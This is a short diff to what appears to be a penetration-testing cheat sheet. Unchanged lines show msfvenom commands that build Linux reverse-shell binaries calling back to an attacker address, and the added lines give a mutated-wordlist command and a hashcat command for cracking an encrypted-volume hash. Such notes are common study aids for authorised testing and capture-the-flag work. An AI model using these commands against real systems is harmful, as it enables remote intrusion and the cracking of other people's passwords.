@@ -321,7 +321,12 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.e
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=$MYIP LPORT=5555 -f elf -o shell.elf
 
 [*] Cracking
++---------- Mutated Wordlist ----------+
+psudohash.py -w phantom -y 2023-2025 -cpb -cpa -cpo -ap '~,`,!,@,#,$,%,^,&,*,(,),_,+,{,},|,:,",<,>,?,,,.,/,;,[,],\,-' -o mutated.list
+
 +---------- Hashcat ----------+
+hashcat -m 13721 FILENAME.hc mutated.list
+
 0 	MD5
 100	SHA1
 1400	SHA256
